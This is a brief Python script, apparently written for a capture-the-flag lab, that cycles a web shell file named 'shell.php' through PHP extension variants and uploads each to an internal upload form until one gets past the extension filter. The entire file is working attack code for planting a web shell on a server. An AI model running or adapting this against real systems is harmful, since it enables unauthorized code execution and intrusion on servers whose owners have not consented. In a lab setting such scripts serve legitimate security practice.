#!/usr/bin/python3

import requests
from os import rename

ip = "10.10.104.250"
url = f"http://{ip}:3333/internal/index.php"

extensions = [".php", ".php3", ".php4", ".php5", ".php6", ".phtml"]

old_file = "shell.php"
file_name = "shell"

for ext in extensions:

	new_file = file_name + ext
	#print(file)
	rename(old_file, new_file)

	files = {"file" : open(new_file, "rb")}
	r = requests.post(url, files=files)

	#print(r.text)
	
	if "Extension not allowed" in r.text:
		print(f"{ext} not allowed")
	else:
		print(f"{ext} allowed!!")
		break

	old_file = new_file
